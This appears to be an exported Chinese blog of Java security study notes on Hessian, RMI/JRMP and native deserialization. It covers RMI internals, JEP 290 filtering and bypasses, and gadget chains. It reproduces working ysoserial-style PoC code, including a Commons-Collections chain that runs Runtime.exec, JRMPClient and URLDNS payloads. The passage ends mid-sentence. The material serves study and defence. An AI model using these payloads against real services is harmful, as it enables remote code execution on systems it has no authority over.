调用处理逻辑\n\n跟进看 invoke，会根据参数 objectId 决定调用哪个\n\n再看 HessianSkeleton 这个类，其继承于 AbstractSkeleton ，负责对 Hessian 提供的服务进行封装。先看下 AbstractSkeleton 所作工作：抽离出 apiClass 中的所有方法，针对每个方法依次将 &lt;方法名, 方法&gt; 以及 &lt;方法名__&lt;参数长度&gt;, 方法&gt; 放入 _methodMap 当中\n\n而对于 HessianSkeleton，初始化时将服务对象封装在 _service 字段\n\n然后再看 invoke 方法逻辑，这里会先读取协议头部字段，根据头部值来决定使用哪种输入输出流类型，之后调用 invoke(_service, in, out)\n\n跟进后，可以看到首先读取方法名和参数长度，构建之前的自定义签名并查找该方法。之后利用反序列化参数值，反射调用 servie 对象的方法并将结果写回返回流\n\n\nSpring 部分\n处理逻辑基本上和 Servlet 的是一样的，另外这里也重写了类加载器\n\n\n序列化与反序列化流程\n「序列化」：Hessian2Output#writeObject()，这里会根据对象类型来调用具体的 serializer 的 writeObject 方法。对于自定义类默认是 UnsafeSerializer\n\n我们查看 UnsafeSerializer#writeObject() ，可以看到先调用了 writeObjectBegin()\n\n这里对于 1.0 和 2.0 版本的 Hessian 处理是不同的\n\n\nHessian 2.0 中将会调用 writeDefinition20 和 Hessian2Output#writeObjectBegin 方法写入自定义数据，就不再将其标记为 Map 类型\n\n「反序列化」：Hessian2Input#readObject()，会根据读取的标识位调用不同实现类来处理\n\n与序列化时一样，Hessian 2.0 以前对于自定义类将以 map 类型标记，因此在反序列化时也会按照 map 类型来读取\n\n实际调用的是 MapDeserializer#readMap()，会循环遍历反序列化内容，并将结果 put 进创建的 map 中\n\n对于 Hessian 2.0 则用 UnsafeDeserializer#readObject 来处理。instantiate 方法直接用  Unsafe 类静态方法创建的实例；之后反序列化读取 field 值\n\n\n\n\n漏洞\n之前提到反序列化时对于 map 标记类型的序列化数据调用的是 MapDeserializer#readMap() 根据指定的 _type 选择 HashMap 还是 SortedMap （接口实现用的是 TreeMap）\n之后遍历反序列化 key 和 value 并放入 map，对比一下这两种类的 put 操作：\n\nHashMap put 时会触发 key 的 hashCode() 方法\n\n\nTreeMap put 时会触发 key 的 compareTo 方法\n\n其次还有一个限制在于对于 transient 和 static 修饰的成员变量，是不会参与到反序列化流程中的，具体原因可见 UnsafeSerializer#introspect() ，在遇到这两个字段的变量时会直接忽略\n\n\n\n总结限制如下：\n\n\nkick-off chain 起始方法只能为 hashCode/equals/compareTo 方法；\n利用链中调用的成员变量不能为 transient 修饰；\n所有的调用不依赖类中 readObject 的逻辑，也不依赖 getter/setter 的逻辑。\n\n\n\nGadget\n0x1. Rome该条利用链的核心在于 ToStringBean#toString() 方法，可以任意调用无参 getter 方法，那么就可以配合 JdbcRowSetImpl#getDatabaseMetaData() 实现 JNDI 注入\n\n外层封装利用的是 EqualsBean 和 HashMap ，触发点在 HashMap put 操作上\n\n如果不出网的话这个 gadget 就无了，并且 TemplatesImpl 也是行不通的，因为这里的 _tfactory 字段被 transient 所修饰\n\n因此接下来的利用思路就是要么找二次反序列化，要么找不被 transient 修饰的且可直接利用(代码执行/命令执行)的函数\n\n参考链接\n[1]https://su18.org/post/hessian/\n[2]https://y4tacker.github.io/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/#%E6%AD%A3%E6%96%87\n\n\n","tags":["Java安全"]},{"title":"Java Sec —— RMI","url":"/2023/09/16/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94RMI%203ca75d88fc8d4a1b9988a56475a5b265/","content":"Java 学习笔记——RMI0x00. BackGroundRMI (Remote Method Invocation) 远程方法调用\n\nRMI 引入了两个概念，分别是 Stubs（客户端存根） 以及 Skeletons（服务端骨架），当客户端（Client）试    图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stub，而在调用远端（Server）的目标类之前，也会经过一个对应的远端代理类，就是 Skeleton，它从 Stub 中接收远程方法调用并传递给真实的目标类。\n\n可以看到，RMI 整个通信方式与邮件发送与接收所经过的协议流程类似\n\n\nRMI 所支持的特性：\n\n动态类加载\n RMI 支持动态类加载，如果设置了 java.rmi.server.codebase，则会尝试从其中的地址获取 .class 并加载及反序列化\n 设置方法：\n 开启 RMI 安全策略管理并配置对应的策略文件\n System.setProperty(&quot;java.rmi.server.codebase&quot;,&quot;[http://127.0.0.1:9999/](http://127.0.0.1:9999/)&quot;);\n 使用启动参数 -Djava.rmi.server.codebase=&quot;http://127.0.0.1:9999/&quot; 进行指定\n\n\n\n\n0x01. 源码解析\n测试 demo\n\nJava code for Server side\n  public class RemoteServer &#123;    public static void main(String[] args) throws RemoteException, MalformedURLException, AlreadyBoundException, InterruptedException &#123;        startReg();        // 创建远程对象        RemoteInterface remoteObject = new RemoteObject();        // 绑定        Naming.bind(&quot;rmi://localhost:1099/Hello&quot;, remoteObject);    &#125;    public static void startReg() &#123;        try &#123;            LocateRegistry.createRegistry(1099);            System.out.println(&quot;Server Start&quot;);        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\nJava code for Client side\n  public class Client &#123;    public static void main(String[] args) throws RemoteException, NotBoundException &#123;        // sun.rmi.registry.RegistryImpl_Stub        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);        System.out.println(Arrays.toString(registry.list()));        // lookup and call        RemoteInterface stub = (RemoteInterface) registry.lookup(&quot;Hello&quot;);        System.out.println(stub.sayHello());        System.out.println(stub.sayGoodbye());    &#125;&#125;\n\nJava code for Remote object Interface\n  public interface RemoteInterface extends Remote &#123;    public String sayHello() throws RemoteException;    public String sayHello(Object name) throws RemoteException;    public String sayGoodbye() throws RemoteException;&#125;\n\nJava code for Remote object Implementation\n  public class RemoteObject extends UnicastRemoteObject implements RemoteInterface &#123;    protected RemoteObject() throws RemoteException &#123;    &#125;    @Override    public String sayHello() throws RemoteException &#123;        return &quot;Hello My Friend&quot;;    &#125;    @Override    public String sayHello(Object name) throws RemoteException &#123;        return name.getClass().getName();    &#125;    @Override    public String sayGoodbye() throws RemoteException &#123;        return &quot;Bye&quot;;    &#125;&#125;\n\n\n\n流程分析\n\n\n服务注册1. 远程对象创建起始于：RemoteInterface remoteObject = new RemoteObject();\n其继承于父类 UnicastRemoteObject 因此初始化时会调用其构造函数, port 默认为 0，并继续调用 exportObject 方法\n\n\n这里可以看到在 export 自身的同时，还会新建 UnicastServerRef 实例，这个东西内部会进一步创建一个 LiveRef 对象，由随机数+端口进行标识\n\n\n跟进发现，它还会继续调用 TCPEndpoint.getLocalEndpoint(var2)\n其中会初始化网络通信所需的 host port 等信息\n\n最终将 TCPEndpoint 实例赋值到 LiveRef 的 ep 字段中\n\n回到主线，Remote 对象会进一步通过 UnicastServerRef 实例进行 export\n\n\n\n可以看到该 UnicastRef 实例所存的就是之前保存了网络通信信息的 LiveRef\n\n跟进可以看到，首先创建了一个以 “_Stub” 为后缀的类实例（构造函数参数为包含已初始化LiveRef 的 UnicastRef 实例）\n其次为 Remote 对象创建了动态代理（利用 RemoteObjectInvocationHandler）\n\n对于 RemoteObjectInvocationHandler 其 invoke 方法，当待调用代理方法非 Object 声明，并且方法名不是 finalize 时，会调用 invokeRemoteMethod\n\n这里可以看到实际上真正调用的是 sun.rmi.server.UnicastRef#invoke(java.rmi.Remote, java.lang.reflect.Method, java.lang.Object[], long)\n\n\n该方法会获取 LiveRef 当中的网络通信信息，创建连接，执行调用，并获取结果执行 unmarshalValue 进一步执行原生反序列化\n\n回到 createProxy 方法，，将动态代理和 Remote 实例封装到 Target 类当中之后调用 sun.rmi.transport.LiveRef#exportObject 方法，其会进一步调用 TCPTransport#exportObject 来监听端口\n\n\n注意到之后会将 Target 实例通过 sun.rmi.transport.Transport#exportObject 放到 ObjectTable 中\n\n该 ObjectTable 内部通过 HashMap 管理所有 Target 实例，支持通过 ObjectEndpoint 和 WeakRef 进行索引\n\n2. 注册中心创建起始于 LocateRegistry.createRegistry(1099);\n首先调用 RegistryImpl 构造函数，根据端口是否指定 1099 进入不同控制分支，但都会创建 LiveRef 通讯实例以及 UnicastServerRef 对象。接下来调用 setup 方法\n\n后者跟进 UnicastServerRef#exportObject 第一个参数为当前类实例 RegistryImpl\n\n后续流程同样走到 sun.rmi.server.Util#createProxy 不同点在于这里 stubClassExists 方法 withoutStubs map 是空的，因此会成功创建 RegistryImpl_Stub 实例并返回，不再进一步向下创建动态代理\n\nRegistryImpl_Stub 类继承于 RemoteStub 并实现了一系列 bind list lookup 等服务操作 API\n\n与服务注册时使用的 RemoteObjectInvocationHandler 类似，其通信时数据传输也是通过直接序列化实现\n\n后续注册中心就会调用 setSkeleton 方法设置服务端 skeleton，可以看到实际会通过反射创建 RegistryImpl_Skel 实例，设置到 UnicastServerRef 的 skel 字段上\n\n\n后续流程与创建远程服务对象一致，创建 Target，并设置到 ObjectTable 中\n3. 服务注册通用方法是 registry.bind \n服务发现请求注册中心体现在 LocateRegistry.getRegistry()\n「服务端行为」：\n首先创建了一个包含注册中心通信地址的 RegistryImpl_Stub 对象；\n\n接下来调用 bind 方法进行服务对象和命名绑定时实际会调用 sun.rmi.registry.RegistryImpl_Stub#bind 方法，首先通过父类 UnicastRef 上设置好通讯地址的 ref 字段来调用 sun.rmi.server.UnicastRef#newCall\n这里就是简单通过 UnicastRef#newCall 与注册中心建立连接，后续直接写入输出流，写入方法名和远程实例\n\n💡 这里存在疑问点：与 su18 师傅提到的调用方法存在出入，实际写入的应该是服务端之前已经保存在 ObjectTable 当中的 RemoteObjectInvocationHandler 动态代理（根据 Remote 实例来索引）「可能的解释」：Registry 端与服务端在同一位置上，两者之前的通讯信息并非通过TCPTransport ，无法复现出 su18 师傅的信息，这里仔细看他的内容解释\n服务调用以客户端获取到注册中心后，调用 lookup 寻找指定命名的 RMI 服务为例\n\n过程很简单，建立连接、序列化服务名称并写入输出流、获取到输入流并执行反序列化\nRegistry 端/服务端表现位于 RegistryImpl_Skel 的 dispatch 方法\n整体流程框架\n0x02. Attack1. 攻击 Server 端\n恶意服务参数\n  发生在客户端调用远程服务对象的方法时，通过获取到的远程代理，传输序列化的方法名（SHA1 based hash）及参数\n  一般情况下，若远程服务接口对应的方法参数类型为 Object，则可以直接构造任意的序列化数据造成 RCE Attack\n  但是若不知道方法参数具体类型，仍想要传输任意类型的序列化数据，该怎么办？\n\n  TODO 📭\n  基本思路就是利用 agent 等方式，hook 住 RemoteObjectInvocationHandler 的 invokeRemoteMethod 方法方法，也就是客户端在利用代理，调用服务端对象方法时，参数类型传递时动态修改为指定要求的类型即可\n\n动态类加载\n  ==「适用版本」==6u45/7u21\n  条件：SecurityManager + java.rmi.server.useCodebaseOnly=false\n  position: 反序列化操作发生在服务端接收响应客户端发来的网络请求时，调用的 sun.rmi.server.UnicastServerRef#dispatch 方法，序列化输入流由 MarshalInputStream 封装，期间执行 resolveClass 检查序列化数据\n\n  其 var5 反序列化得到指定 codebase url 地址，同时想要真正执行类加载，还需要满足 useCodebaseOnly 为 false，这也是为什么存在版本限制（6u45/7u21 默认为 false)\n  重点在于 codebase 地址可以被双方控制\n\n\n2. 攻击 Registry 端以 bind 为例，注册端知道会使用 sun.rmi.registry.RegistryImpl_Skel#dispatch 来接收服务端发来的序列化的服务名称以及远程代理对象，并通过 RegistryImpl 的 bind 方法保存在 bindings HashTable 中\n\n因此这里可以直接传递恶意的序列化远程代理类，在注册端反序列化时 RCE\n具体的实践：yso_RMIRegistryExploit\nyso 中以 CC1 为例，获取到 CC1 恶意 gadget 后，创建 Remote 代理(利用的 handler 是 AnnotationInvocationHandler，将 payload 设置到 handler 的 map 中，反序列化时伴随着触发)，之后通过 bind 序列化传递\n\n3. 攻击 DGC\nServer 端启动 DGCImpl，在 Registry 端注册 DGCImpl_Stub ，Client 端获取到 DGCImpl_Stub，通过其与 Server 端通信，Server 端使用 RegistryImpl_Skel 来处理。\n\nDGC 在客户端接收服务端返回的远程对象调用同时，会创建 DGCImpl_Stub 以及 DCGImpl_Skel 来维护远程对象的引用\n==「DCGImpl_Skel#dispatch」==：监听请求\n\n==「DGCImpl_Stub#dirty/clean 更新/回收引用对象」==：\n\n武器化Exploit: ysoserial —— JRMP\nJRMP Listener module\n  本质是一条反序列化 Gadget ，可以达到在本地指定端口开启 JRMP 协议的效果\n  /** * Gadget chain: * UnicastRemoteObject.readObject(ObjectInputStream) line: 235 * UnicastRemoteObject.reexport() line: 266 * UnicastRemoteObject.exportObject(Remote, int) line: 320 * UnicastRemoteObject.exportObject(Remote, UnicastServerRef) line: 383 * UnicastServerRef.exportObject(Remote, Object, boolean) line: 208 * LiveRef.exportObject(Target) line: 147 * TCPEndpoint.exportObject(Target) line: 411 * TCPTransport.exportObject(Target) line: 249 * TCPTransport.listen() line: 319 * * Requires: * - JavaSE * * Argument: * - Port number to open listener to */\n  作用大致就是类似反连平台，可以自动响应连接请求，并返回指定的序列化数据\n  ==「Gadget 构造」==：\n  首先看下用到的类，首先拿到 RemoteObject 的构造函数（参数类型为RemoteRef, 参数实例传递子类 UnicastServerRef，并指定端口）\n\n  之后会调用 sun.reflect.ReflectionFactory#newConstructorForSerialization 传入 var1 代表 ActivationGroupImpl class，var2 代表指定 RemoteObject 构造器，当 var2 的声明类非 var1 时，会去创建序列化构造函数（ActivationGroupImpl 类）\n\n  这里的作用实际创建一个序列化构造函数，允许在反序列化时调用构造函数来创建新的对象实例\n\n如果想在反序列化时执行一些特殊的初始化或处理步骤，可以在类中定义一个特殊的构造函数，然后在该构造函数中执行这些操作。但请确保这个构造函数是 public 的且没有参数。\n\n\n  最终返回的是 ActivationGroupImpl 实例，向上转型为 UnicastRemoteObject（好神奇\n  最后反射设置字段 port 为指定端口\n  ==「Gadget 反序列化分析」==：\n  回忆 UnicastRemoteObject 的作用\n\njava.rmi.server.UnicastRemoteObject 类通常是远程调用接口实现类的父类，或直接使用其静态方法 exportObject 来创建动态代理并随机监听本机端口以提供服务。\n\n  也就是我们在创建远程服务对象时声明其为父类的那个\n  readObject 方法中会执行 reexport() \n\n  之后指定端口 exportObject\n\n  export 过程中创建 UnicastServerRef 网络通信实例\n\n  之后的分析与前面一致了就，势必会打开指定端口的 JRMP 协议，监听请求，期间的网络传输数据采用序列化格式\n\n  那么 ActivationGroupImpl 在这里的作用是什么？\n  这里不是很懂，应该是父类 UnicastRemoteObject 构造函数无法直接构造，或者使用 UnSafe 来构造也可以\n\nJRMP JRMPClient(payload)\n  /** * * * UnicastRef.newCall(RemoteObject, Operation[], int, long) * DGCImpl_Stub.dirty(ObjID[], long, Lease) * DGCClient$EndpointEntry.makeDirtyCall(Set&lt;RefEntry&gt;, long) * DGCClient$EndpointEntry.registerRefs(List&lt;LiveRef&gt;) * DGCClient.registerRefs(Endpoint, List&lt;LiveRef&gt;) * LiveRef.read(ObjectInput, boolean) * UnicastRef.readExternal(ObjectInput) * * Thread.start() * DGCClient$EndpointEntry.&lt;init&gt;(Endpoint) * DGCClient$EndpointEntry.lookup(Endpoint) * DGCClient.registerRefs(Endpoint, List&lt;LiveRef&gt;) * LiveRef.read(ObjectInput, boolean) * UnicastRef.readExternal(ObjectInput) * * Requires: * - JavaSE * * Argument: * - host:port to connect to, host only chooses random port (DOS if repeated many times) * * Yields: * * an established JRMP connection to the endpoint (if reachable) * * a connected RMI Registry proxy * * one system thread per endpoint (DOS)\n  入口点从任意一个继承父类 RemoteObject 的对象开始，父类的 readObject 方法会进一步调用 ref 字段的 readExternal 方法\n  sun.rmi.server.UnicastRef#readExternal 这里会调用 [LiveRef.*read](http://LiveRef.read)* 来恢复创建 ref 字段的通信实例\n\n  创建 TCPEndpoint 之后，会进一步调用 DGCClient.*registerRefs*\n\n  其中会循环获取所有通信节点，调用 EndpointEntry#registerRefs 最后调用 makeDirtyCall\n\n  最后触发 DGC 的 dirty 操作\n\n因此可以看出，在 UnicastRef 进行反序列化时，会触发 DGC 通信及 dirty 方法调用，此时如果与一个恶意服务通信，返回恶意数据流，则会造成反序列化漏洞。\n\n  yso 项目中使用的是 RemoteObjectInvocationHandler 作为 handler，封装成 Registry 的代理类\n  利用：利用JRMPClient这个Gadget去调用JRMPListener,然后JRMPListener利用CommonsCollections这个Gadget来实现RCE。\n\n精简版\n  因为 RemoteObjectInvocationHandler 动态代理 Registry 接口形成的这个 Registry 已经后续被列入黑名单了，因此需要绕过。\n\n缩短链子\n  我们知道上一条链子中 UnicastRef 实现了 Externalizable 接口，因此可以直接反序列化并调用重写 readExternal 方法，进而触发和前述一样的利用链\n\nJava Poc\n  public Object getObject(String command) throws Exception &#123;        String host;        int port;        int sep = command.indexOf(&#x27;:&#x27;);        if ( sep &lt; 0 ) &#123;            port = new Random().nextInt(65535);            host = command;        &#125;        else &#123;            host = command.substring(0, sep);            port = Integer.valueOf(command.substring(sep + 1));        &#125;        ObjID id = new ObjID(new Random().nextInt()); // RMI registry        TCPEndpoint te = new TCPEndpoint(host, port);        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));        return ref;    &#125;\n\n\n\n更换代理接口\n\n\n\n\n0x03. JEP 290\n提供的机制如下：\n\n(1) 提供一个限制反序列化类的机制，白名单或者黑名单\n(2) 限制反序列化的深度和复杂度\n(3) 为 RMI 远程调用对象(exportObject)提供了一个验证类的机制\n(4) 定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器\n\n版本：\n\n\nJEP 290 主要是在 ObjectInputStream 类中增加了一个serialFilter属性和一个 filterChcek 函数，其中 serialFilter就可以理解为过滤器。在 ObjectInputStream 对象进行 readObject 的时候，内部会调用 filterChcek 方法进行检查，filterCheck方法中会对 `serialFilter属性进行判断，如果不是 null ,就会调用 serialFilter.checkInput 方法进行过滤。设置过滤器本质就是设置 ObjectInputStream 的 serialFilter 字段值，设置过滤器可以分为设置全局过滤器和设置局部过滤器：\n\n设置全局过滤器是指，通过修改 Config.serialFilter这个静态字段的值来达到设置所有 ObjectInputStream对象的 serialFilter值 。具体原因是因为 ObjectInputStream 的构造函数会读取Config.serialFilter的值赋值到自己的serialFilter字段上，所有就会导致所有 new 出来的 ObjectInputStream对象的 serailFilter 都为Config.serialFilter的值。\n设置局部过滤器是指，在 new ObjectInputStream 的之后，再修改单个 ObjectInputStream 对象的 serialFilter 字段值\n\n\nJEP290 机制，实际可以通过 JVM 穿参数或者配置文件的方式来设置防御规则，RMI 可采用默认白名单的防御规则。规则传入为字符串形式，在 Global 类的构造函数中进行解析，具体解析逻辑如下所示\n\n解析之后返回并设置到 ObjectInputFilter 类的 configuredFilter 字段上，当 ObjectInputStream 在初始化时，便会获取到 configuredFilter 字段上的实例，并设置到输入流的 serialFilter 字段之上。当进行 readObject 之前会自动触发 filterCheck 方法，进而 serialFilter 非空时调用 serialFilter.checkInput 枚举输入流中的类与规则进行匹配，进行合法性校验\n\n「RMI 中 JEP290 机制的实现」：\nRegistryImpl 在构造函数中，伴随着 UnicastServerRef2 的初始化，会通过 lambda 表达式以及方法引用的方式设置 RMI 的默认 JEP290 防御规则\n\n\n上图是 RegistryImpl 的 registryFilter 这个静态常量字段通过 JVM 传参或者配置文件的方式来设置过滤器\n下图可以看到如果 registryFilter 为空，或者 checkInput 方法返回 Status.UNDECIDED 字面量的话则会采用 RMI 默认的 JEP 防御规则。\n\n在服务端后续处理序列化数据请求（匹配 RegistryImpl 对应的 ObjID）时，可以看到 RMI 通过 Config.setObjectInputFilter 的方式设置 RMI 局部过滤器，\n\nDGCImpl 与 RegistryImpl 设置过滤器的方式基本一致\n\n\nRMI JEP290 绕过\n  case1: 如果服务端”绑定”了一个对象，他的方法参数类型是Object 类型的方法时，则可以绕过 JEP 290\n  本质：普通对象在 exportRemoteObject 时，不会像 RegistryImpl 和 DGCImpl 一样，注册带有初始化好的 filter 到 UnicastServerRef 上，进而在导出并封装到 Target 的过程中， disp 实际时 filter 字段为 null 的 UnicastServerRef。\n  因此，后续在根据 ObjId 从 ObjectTable 中获取 Target 后 disp 后，再进行 dispatch 过程，上述的 unmarshalCustomCallData 方法由于 filter 为 null 因此会直接返回 null, 进而调用 unmarshalValue 方法触发原生反序列化的 source，不再进行 filterChcek 等类检查操作，绕过了 JEP 290 限制\n  case2: 对于方法参数类型是由 Object 类型引申类型（如 String），可如下操作：\n\n\n将 java.rmi 软件包的代码复制到新软件包，然后在其中更改代码\n\n将调试器附加到正在运行的客户端，并在序列化对象之前替换对象\n\n使用 Javassist 之类的工具更改字节码\n通过实现代理来替换网络流上已经序列化的对象\n\n\n\n\n0x04. Extension\nPentest\n\nDiscovery\n  nmap 服务发现，支持 RMI 注册端口探测、接口探测以及具体代理实现的位置探测\n\n\n\n\neasycve\n\n\n\n\n我们在远程复现时会遇到一个 trick：RMI 默认获取的 IP 地址为主机网卡的地址，而非浏览器上显示的公网地址，因此可能会出现服务端对象无法调用的情况，可以利用 debugger 或者反射修改一下 LiveRef 字段 ep 属性中的 host 值\n参考链接[1] https://su18.org/post/rmi-attack/\n[2] 浅学RMI反序列化 | Boogiepop Doesn’t Laugh (boogipop.com\n[3] mogwailabs/rmi-deserialization: Slides/Demos from the BSides Munich 2019 talk “Attacking Java RMI in 2019” (github.com)\n[4] JRMP安全问题分析-从CVE到CTF - 先知社区 (aliyun.com)\n","tags":["JAVA安全"]},{"title":"Java Sec —— 原生反序列化","url":"/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/","content":"Java 学习笔记——原生反序列化\n一个比较清楚的调用图 https://boogipop.com/2023/03/02/Java反序列化研究/\n\n\nps: 从 notion 中直接导出的，看着有点奇怪\n0x00. PHP 反序列化与 Java 反序列化的区别\nreadObject 倾向于解决“反序列化时如何还原一个完整对象”这个问题，而 PHP 的 **wakeup 更倾向于解决“反序列化后如何初始化这个对象**”的问题。\n0x01. URLDNS DNS 探测器\n\nPOC\n\nJava Poc\n  public Object getObject(final String url) throws Exception &#123;                //Avoid DNS resolution during payload creation                //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.                URLStreamHandler handler = new SilentURLStreamHandler();                HashMap ht = new HashMap(); // HashMap that will contain the URL                URL u = new URL(null, url, handler); // URL to use as the Key                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.                Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.                return ht;        &#125;\n\n\n\n\n整个调用链过程：\n\nHashMap-&gt;readObject()HashMap-&gt;hash()URL-&gt;hashCode()URLStreamHandler-&gt;hashCode()URLStreamHandler-&gt;getHostAddress()InetAddress-&gt;getByName()\n  sink 点： java.net.URLStreamHandler#getHostAddress\n![Untitled](Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%201.png)\n\n**细节**：为了防止在构造 POC 过程中触发 DNS 解析导致缓存，yso 作了如下设置\n\nReflections.setFieldValue(u, &quot;hashCode&quot;, -1);  // u: URL\n原因在于 `java.net.URL#hashCode` 中会对 URL 实例的 hashCode 字段判断（如果已经对 url 作过 DNS 解析，则 hashCode 字段不等于 -1）\n\n![Untitled](Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%202.png)\n0x02. CC1 (work on JDK ≤ 8u71)\n\n限制条件\n  commons-collections:3.1 组件\n  JDK ≤ 8u71\n\nTransformer 武器套件\n   ConstantTransformer InvokerTransformer ChainedTransformer\n\n触发器\n\nTransformedMap\n  TransformedMap 对 innerMap 作了修饰，传出的 outerMap 是修饰后的 Map\n  Map outerMap = TransformedMap.decorate(innerMap, KeyTransformer, valueTransformer);\n\nkeyTransformer 是处理新元素 key 的回调，valueTransformer 是处理新元素 value 的回调；这里的回调并不是回调函数 而是一个实现了上面 Transformer 接口的类\n\n\nAnnotationInvocationHandler\n  观察 readObject 方法：其中 memberValues 字段是我们可以设计好的 map（配合 TransformedMap）其会遍历元素并在满足一定条件后调用 setValues 方法，进而触发后续的利用链\n\n\n条件是：\n\nsun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数为 Annotation 的子类，且必须至少含有一个方法，假设方法名为 X\n被 TransformedMap.decorate 修饰的 Map 中必有一个键名为 X 的元素\n\n为什么呢？因为 AnnotationInvocationHandler 在执行 readObject 方法时，会获取到其构造方法时赋值好的字段 memberValue(Map) 和 type(Class&lt;? extends Annotation&gt;)，并枚举 map 的 key，实例化 type 并获取 key 同名属性，if 条件句会判断结果是否为 null 决定控制流的继续\n\n  注：这里选择的子类为 java.lang.annotation.Retention 其中包含一个方法 value() , 因此需要在 map 中存放一个键名同样为 value 的元素\n\n\nJava Poc\n  public InvocationHandler getObject(final String command) throws Exception &#123;\t\tfinal String[] execArgs = new String[] &#123; command &#125;;\t\t// inert chain for setup\t\tfinal Transformer transformerChain = new ChainedTransformer(\t\t\t\tnew Transformer[]&#123; new ConstantTransformer(1) &#125;);\t\t// real chain for after setup\t\tfinal Transformer[] transformers = new Transformer[] &#123;\t\t\t\tnew ConstantTransformer(Runtime.class),\t\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;\t\t\t\t\t\tString.class, Class[].class &#125;, new Object[] &#123;\t\t\t\t\t\t&quot;getRuntime&quot;, new Class[0] &#125;),\t\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;\t\t\t\t\t\tObject.class, Object[].class &#125;, new Object[] &#123;\t\t\t\t\t\tnull, new Object[0] &#125;),\t\t\t\tnew InvokerTransformer(&quot;exec&quot;,\t\t\t\t\t\tnew Class[] &#123; String.class &#125;, execArgs),\t\t\t\tnew ConstantTransformer(1) &#125;;\t\tHashMap innerMap = new HashMap();\t\tinnerMap.put(&quot;value&quot;, &quot;xxx&quot;);\t// 存放键名要求\t\tMap outerMap = TransformedMap.decorate(innerMap, null, transformerChain);\t\t\t\tInvocationHandler handler = (InvocationHandler) Reflections.newInstance(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;, Retention.class, outerMap);\t\tReflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);\t\treturn handler;\t&#125;\n\n\n\n\n\n\n&gt; 注：版本修复：8u71 以后，新建了一个 `linkedHashMap` 对象，并将原来的键值添加进去。 所以后续对 Map 的操作都是基于这个新的 `LinkedHashMap` 对象，而原来我们精心构造的 Map 不再执行 set 或 put 操作，也就不会触发 RCE 了\n&gt; \n- LazyMap\n\n    `LazyMap#get()` 方法中会调用 factory(`Transformer类`) 字段的 transform 方法，当设计为我们构造的 gadget 时，便可触发 RCE\n\n    ![Untitled](Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%205.png)\n\n    那么接下来就是寻找可以触发 get 方法的调用点\n\n    yso 的利用构造过程如下：\n\n    1. 首先将经过 LazyMap 修饰过的 HashMap 作一层代理\n\n        final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);\n\n    2. 接下来再进一步包装 mapProxy，将其装入`AnnotationInvocationHandler` 的 `memberValues` 字段，等待反序列化时被触发，调用 invoke 方法执行代理逻辑\n\n        进而其中的 lazyMap 会触发 get 方法执行 RCE gadget\n\n        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);\n\n        ![Untitled](Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%206.png)\n\n\n    Gadget chain:\t\tObjectInputStream.readObject()\t\t\tAnnotationInvocationHandler.readObject()\t\t\t\tMap(Proxy).entrySet()\t\t\t\t\tAnnotationInvocationHandler.invoke()\t\t\t\t\t\tLazyMap.get()\t\t\t\t\t\t\tChainedTransformer.transform()\t\t\t\t\t\t\t\tConstantTransformer.transform()\t\t\t\t\t\t\t\tInvokerTransformer.transform()\t\t\t\t\t\t\t\t\tMethod.invoke()\t\t\t\t\t\t\t\t\t\tClass.getMethod()\t\t\t\t\t\t\t\tInvokerTransformer.transform()\t\t\t\t\t\t\t\t\tMethod.invoke()\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()\t\t\t\t\t\t\t\tInvokerTransformer.transform()\t\t\t\t\t\t\t\t\tMethod.invoke()\t\t\t\t\t\t\t\t\t\tRuntime.exec()\n\n\n**总结一下**两层 AnnotationInvocationHandler 的作用：内层作用的是动态代理，为了能调用到 invoke 方法进而触发到 `lazymap.get()` 而外层的 AnnotationInvocationHandler 主要是为了作反序列化入口\n0x03. CC6 突破 AnnotationInvocationHandler 高版本限制\n\n限制条件\n  commons-collections:3.1 \n  无 jdk 版本限制\n\n新的触发器\n\norg.apache.commons.collections.keyvalue.TiedMapEntry\n  其 hashCode 方法中会调用 getValue() 方法，进一步调用字段 map 的 get 方法\n\n\n新的入口点：HashSet（不再使用 AnnotationInvocationHandler 作为入口点，或者将 HashMap 